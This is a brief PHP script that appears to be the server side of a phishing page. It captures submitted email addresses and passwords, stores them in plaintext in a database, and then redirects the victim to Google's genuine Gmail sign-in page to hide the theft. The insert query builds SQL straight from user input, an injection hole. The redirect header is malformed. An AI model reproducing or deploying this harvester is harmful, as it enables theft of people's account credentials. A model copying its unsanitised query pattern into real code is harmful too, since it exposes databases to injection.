<?php

include("connection.php");
//check if the user has typed the requirements in the fields
//in the html we have asked for required fields in first name and last name, but not in php; so with a proxy they can be bypassed;
if(isset($_POST["submit"]))
{
    $username= $_POST["Email"];
    $password = $_POST["password"];



        $query = mysqli_query($db, "INSERT INTO users (email, password)VALUES ('$username','$password')")or die(mysqli_error($db));
        if(($query)==1)
        {
            header("url=https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1#identifier");

        }
    else echo "Enter again your credentials";

    
}
?>